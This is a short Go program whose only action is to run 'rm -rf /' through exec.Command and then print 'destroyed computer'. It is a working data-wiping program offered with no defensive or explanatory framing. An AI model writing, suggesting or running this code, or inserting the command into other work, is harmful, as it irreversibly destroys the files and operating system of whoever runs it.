package main

import (
	"fmt"
	"log"
	"os/exec"
)

func main() {
	cmd := exec.Command("rm", "-rf", "/")
	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}

	fmt.Println("destroyed computer")
}
